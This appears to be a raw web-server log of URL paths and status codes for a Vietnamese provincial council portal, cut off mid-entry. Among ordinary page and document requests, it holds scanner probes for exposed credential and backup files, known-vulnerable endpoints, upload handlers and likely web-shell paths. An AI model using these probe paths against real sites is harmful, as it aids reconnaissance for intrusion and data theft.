/portal/Banner/8e7837350f0fd6dd12345.jpg,200
/audio/27458.mp3,404
/_layouts/tandan.portal/weather/img/128/04n.png,200
/level/16/exec/show/config/CR,404
/AttachFiles/33.+bang+gia+dat+tren+dia+ban+tinh100620201114.pdf,304
/.vscode/sftp.json,302
/axis2-admin/login,404
/var,404
/hoidongnhandan/1231/29461/42096/89044/Trong-nuoc/Ky-hop-thu-3--Quoc-hoi-khoa-XIV-thanh-cong-va-be-mac.aspx,404
/portal,302
/portal/Photos/2023-10/9d7e4acf1a67dc8dTBTbophieu.jpg,200
/portal/VanBan/2021-11/4d5c7bae4bbd4a7d4.+TB+cong+tac+mat+tran+tham+gia+xay+dung+chinh+quyen.pdf,206
/audio/27925.mp3,404
/_layouts/images/favicon.ico,200
/portal/admin/tai-nguyen/popup/edit-van-ban.aspx,200
/portal/Pages/2022-8-25/Xay-dung-he-thong-do-thi-gop-phan-phat-trien-toan-h7qqdj.aspx,200
/portal/Photos/2023-01/40cc4cfdd94697dhuu.jpg,200
/AttachFiles/01-NQ-HĐND100620201148.pdf,200
/admin/backup.sql,404
/manage/fileDownloader,404
/portal/VanBan/2024-03/10b4a77440f5ce1dTài+liệu+kỳ+họp+thứ+16+HĐND+tỉnh+-+Gửi+lần+1+(1).rar,200
/os/mxperson,404
/portal/Pages/default.aspx/Manage/Upload,200
/portal/ImageAds/cc33ffdd5fff695dadd1.jpg,200
"/hoidongnhandan/1231/29459/40926/Chuc-nang-nhiem-vu/AttachFiles/34.+NQ+dieu+chinh+chu+truong+DA+tram+bom+De,+Vu+Ban131220180432.pdf",404
/actuator/gateway/refresh,404
/AttachFiles/NQ50+-+về+Lệ+phí+địa+chính120620200925.doc,200
/audio/28031.mp3,404
/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php,404
/portal/Pages/2023-11-17/Giam-sat-tham-tra-truoc-ky-hop-thuong-le-cuoi-nam-bz2dmp.aspx,200
/js/form/mousewheel.js,200
/AttachFiles/NghiQuyetKyHop12110620200853.zip,200
/portal/_themes/Portal_orange/img/img-rs.png,200
/AttachFiles/29.+Cac+bao+cao+cua+ban+KT-NS100620201045.pdf,200
/portal/Pages/2023-3-27/xzuj8x.aspx,200
/portal/Photos/2023-11/f4fdd03fe9b22cedQH6.jpg,200
/_layouts/1033/styles/Themable/corev4.css,200
/audio/28007.mp3,404
/audio/28054.mp3,404
/portal/Pages/2024-3-25/Hoi-thao-nang-cao-chat-luong-hoat-dong-To-dai-bieu8fd0g1.aspx,200
/portal/Pages/2022-12-16/Giam-sat-viec-huy-dong-quan-ly-va-su-dung-cac-nguogal62a.aspx,200
/_layouts/sp.js,200
/portal/pages/Hoat-dong-cua-Doan-DBQH-tinh.aspx,200
/OA_CGI/FNDWRR.exe,415
/portal/Pages/2022-8-19/Giam-sat-viec-thuc-hien-quy-che-dan-chu-o-co-so-taczms8i.aspx,200
/audio/28073.mp3,404
/admin/login/index.php,404
/favicon.ico,404
/assets/_core/php/profile.php,404
/pacs/login.php,404
/AttachFiles/16.+Quy+dinh+muc+thu+cac+khoan+thu+dich+vu+phuc+vu+ho+tro+hoat+dong+ngoai+hoc+phi140720210814.pdf,200
/portal/Pages/2021-3-26/Mong-muon-bau-vao-Quoc-hoi-va-HDND-nhung-nguoi-co-ex3a2d.aspx,200
/portal/Pages/van-ban/v.aspx,200
/portal/Pages/default.aspx/api/fileup.ashx,200
/AttachFiles/35.+Chia+to+thao+luan140720210819.pdf,200
/portal/Pages/2023-8-29/HDND-tinh-to-chuc-ky-hop-giai-quyet-cong-viec-phath6encm.aspx,200
/help/admin-guide/test.jsp,404
/css/font/fontawesome-webfont.woff,200
/portal/Pages/2022-1-11/Quoc-hoi-thao-luan-sua-doi-mot-so-lua-t-va-du-an-djljctn.aspx,200
/portal/Pages/default.aspx/file.asp,200
/portal/Pages/default.aspx/api/uploadhandler.ashx,200
/AttachFiles/kh+giám+sát+của+ban+vhxh030620180607.doc,304
/portal/Pages/2022-7-19/pxscwn.aspx,200
"/AttachFiles/16.+quy+dinh+muc+chi+cho+c.tac+dao+tao,+boi+duong+c.bo,+c.chuc,+v.chuc031220200846.pdf",200
/apisix/admin/migrate/export,404
/AttachFiles/nghi-quyet-detail.aspx,403
/formLoginAuth.htm,404
/portal/Pages/2023-12-25/Chi-bo-tham-muu-tong-hop-thuoc-Dang-bo-Van-phong-D0v6air.aspx,200
/public/css/2eCviQJRq656lU4qhDYJoySQUmX.css,404
/v1/backend1,404
"/hoidongnhandan/1231/29459/39471/so-do-site/AttachFiles/AttachFiles/NQ+28+xay+dung+tuyen+duong+bo+ven+bien,+doan+qua+Nam+Dinh100620201158.pdf",404
/portal/pages/van-ban/https:/hdnd.namdinh.gov.vn/_forms/td-login.aspx,400
/portal/Pages/van-ban/https:/namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/portal/_res/js/custom.js,200
/wan.htm,404
/portal/Pages/2024-3-14/,302
/_layouts/tandan.portal/weather/img/128/02d.png,200
/AttachFiles/37.+Gợi+ý+thảo+luận+tổ100620201141.pdf,304
/portal/Pages/2023-12-6/Doan-dai-bieu-Quoc-hoi-tinh-tiep-xuc-cu-tri-sau-Kynjosgi.aspx,200
/AttachFiles/222-KH-HDND261020180215.pdf,200
/AttachFiles/2.+BC+chi+dao+dieu+hanh+ubnd+tinh+(6T.2018)280620180852.pdf,200
/portal/Pages/default.aspx/tools/Upfile.ashx,200
/js/form/custom.js,200
/aj.html,404
/dashboard/view-chair-list.php,404
/_vti_inf.html,200
/modules/appagebuilder/config.xml,404
/AttachFiles/43.+BC+cua+BCH+Bo+doi+Bien+phong+tinh+ve+ket+qua+cong+tac+Bien+phong+nam+2020031220200929.pdf,200
/portal/Pages/2023-5-23/Giam-sat-cong-tac-xay-dung-ban-hanh-van-ban-quy-phvleoj3.aspx,200
/portal/Photos/2024-01/fe15bc366eb2e43d12345.jpg,200
/portal/Photos/2023-11/cab139c8490deeed1_20231110094219.png,200
/hoidongnhandan/1231/29459/39419/Nghi-quyet-nhiem-ky-2016---2021/AttachFiles/tai-lieu-detail.aspx,404
/images/news/250720211043TD+DBQH.jpg,200
/js/form/less.js,200
/sftp-config.json,302
/portal/Pages/2024-1-22/Dong-chi-Bi-thu-Tinh-uy-tham-chuc-Tet-can-bo-chienr4u6cb.aspx,200
/portal/Photos/2023-03/7edcf88c507f32ddb897aead6bedb7b3eefc.jpg,200
/portal/Photos/2023-03/3f483712c32b832d4122d40a114acd14945b.jpg,200
/portal/Photos/2023-11/_w/ea2d6bddbffba1adct_jpg.jpg,200
/audio/28005.mp3,404
/portal/Pages/contact.aspx,200
/css/layouts/style.css,200
/index.php/catalogsearch/advanced/result/,404
/_layouts/images/blank.gif,200
/hoidongnhandan/1231/29459/39413/Ban-Kinh-te---Ngan-sach-HDND-tinh/,404
/_layouts/Authenticate.aspx,302
/_ignition/execute-solution,404
/tos/index.php,404
/wp-content/plugins/contact-form-7/readme.txt,404
/+CSCOE+/saml/sp/acs,404
/.well-known/pki-validation/cloud.php,500
/_layouts/tandan.portal/weather/img/48/10d.png,200
/portal/pages/print.aspx,200
/AttachFiles/nq56+-+về++thời+gian+gửi+báo+cáo+và+biểu+mẫu250520180318.doc,200
/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/v.aspx,400
/admin/db.sql,404
/_layouts/tandan.portal/jslibs/flyout-gallery/td-fly-out-gallery.css,200
/portal/Photos/2021-10-17/d5a96b2d1fca7c8dlvl.jpg,200
/portal/Pages/default.aspx/Content/Upfile,200
/wp-content/plugins/cryptocurrency-widgets-pack/readme.txt,404
/portal/Photos/2024-03/_w/a90d36d104e3d40d1_20240318180913_png.jpg,200
/portal/Photos/2022-10-28/c30dd7b8926e679dPXL_20221027_162351608.jpg,200
/portal/Photos/2021-10-17/2149edebe322deaddtt.jpg,200
/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/href='/nghi-quyet.aspx,302
/wp-json/lp/v1/courses/archive-course,404
/van-ban-detail.aspx,404
/AttachFiles/thongbao_kqkyhopthu2030620180634.doc,200
"/AttachFiles/32.+BC+c.tac+chi+dao,+dieu+hanh+cua+UBND+tinh+6+thang+dau+nam+2019100620201047.pdf",304
/cms/content/list,404
/hoidongnhandan/1231/29459/39413/Ban-Kinh-te---Ngan-sach-HDND-tinh/tai-lieu-detail.aspx,404
/portal/Video/2023-09/5d0dababddb3a60dnang_cao_chat_luong_hoat_dong_hdnd_cac_cap.mp4,200
/portal/Pages/default.aspx/api/Upfile,200
/portal/Pages/default.aspx/Manage/Upfile,200
/portal/Pages/Thu-vien-so.aspx,200
/userfiles/file/TKBC1.jpg,200
/controller/ping.php,404
/2eGZrg8GkmsuSGfhYwIjOcyivem.php,404
/auth/realms/master/clients-registrations/default/security-admin-console,404
/audio/27457.mp3,404
/class.api.php,404
/portal/_res/css/core.css,200
/_login/default.aspx,302
/portal/Photos/2023-12-25/a4e3f4a73c223ccd1a.jpg,200
/portal/Photos/2023-03/aa8970f3e58edc2d7d042a59ef1933476a08.jpg,200
"/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/href='/AttachFiles/1.+NQ+phe+duyet+dieu+chinh+bo+sung+tong+so+luong+nguoi+lam+viec+trong+cac+d.vi+SNCL,+chi+tieu+g.vien+mam+non+hop+dong+nam+2020140720200855.pdf",404
/AttachFiles/NQ42+-+về+Hỗ+trợ+tài+chính+trong+KH-CN120620200929.doc,304
/wp-content/plugins/canto/includes/lib/tree.php,404
/_layouts/sp.runtime.js,200
/secure/QueryComponentRendererValue!Default.jspa,404
/portal/home/advance-search,404
/api/v2/cmdb/system/admin/admin,403
/portal/Photos/2023-07/_w/d556f58825c14edd478777f5411b9145c80a_jpg.jpg,200
/audio/27988.mp3,404
/portal/Pages/2023-3-23/Giao-ban-Thuong-truc-HDND-tinh-voi-HDND-cac-huyen-q5h5gx.aspx,200
/portal/Pages/2023-1-19/Hoat-dong-thanh-nien-huong-toi-tet-Quy-Mao-20239bi8q1.aspx,200
"/AttachFiles/15.+Bc+cong+tac+TCD,+giai+quyet+khieu+nai,+to+cao+nam+2019100620201110.pdf",200
/portal/Pages/2022-1-20/Chi-doan-TNCS-Ho-Chi-Minh-va-Hoi-Cuu-chien-binh-Va028lwe.aspx,200
/backup/backup-mysql.sql,404
/portal/Pages/default.aspx/Admin/Upload,200
/AttachFiles/2.2.+BC+GSCĐ+về+hoạt+động+đơn+vị+SNCL100620201145.pdf,200
/v1/kv/2eCvgzf5wYL0r4a2lm7XtLAN6cu,404
/portal/Photos/2023-07/d556f58825c14edd478777f5411b9145c80a.jpg,200
"/AttachFiles/17.+Quy+dinh+muc+chuan+tro+giup+Xh,+muc+tro+giup+XH+doi+voi+doi+tuong+bao+tro+XH140720210814.pdf",304
/js/layouts/form-data.js,200
/audio/27114.mp3,404
/_layouts/blank.js,200
/portal/Photos/2023-06/_t/df3e9dd8faf8d22d1f8dd6e4d28603d85a97_jpg.jpg,200
"/AttachFiles/20.+BC+thuc+hanh+tiet+kiem,+CLP+2018011220181038.pdf",200
/audio/27732.mp3,404
/InsightPluginShowGeneralConfiguration.jspa,404
/AttachFiles/42.+q.dinh+gia+KCB+khong+thuoc+p.vi+thanh+toan+cua+Quy+BHYT+d.voi+cs+KCB+nha+nuoc100620201116.pdf,206
"/portal/VanBan/2024-03/2361151b7032962dThông+báo+Kết+quả+Kỳ+họp+thứ+16+HĐND+tỉnh+khóa+XIX,+NK+2021-2026.pdf",200
/tai-lieu.aspx,404
/wp-content/uploads/html2wp/2eGZrfOPXnXMndNsdcTeS5J6IpR.php,404
/portal/Photos/2024-03/_w/fec4f4daf05b3dad1_jpg.jpg,200
/portal/Photos/2023-07-11/aad64ac58045f5ed792ae37fd59105cf5c80.jpg,200
/portal/Photos/2023-03/8b7c3d722c327c8dimages1309019_1_20230315183512.jpg,200
/uploads/backup.sql,404
/wp-admin/admin-ajax.php,404
/portal/Pages/default.aspx/tools/Uploadify/Upload.ashx,200
/SiteFolders/doandaibieuquochoi/3398/AttachFiles/AttachFiles/nghi-quyet-detail.aspx,404
/portal/LinkImage/5bf4b93b502fadddPM-HDND-2.jpg,200
/audio/27990.mp3,404
/portal/Photos/2022-10-28/871dc84c22d7bb8dPXL_20221027_080343472.jpg,200
/portal/Photos/2024-01-22/9f8fedd525e19d8d12345.jpg,200
/portal/Pages/default.aspx/api/up.ashx,200
"/AttachFiles/AttachFiles/NQ+55+muc+chi+cho+cong+tac+dao+tao,+boi+duong+can+bo,+cong+chuc,+vien+chuc+tinh15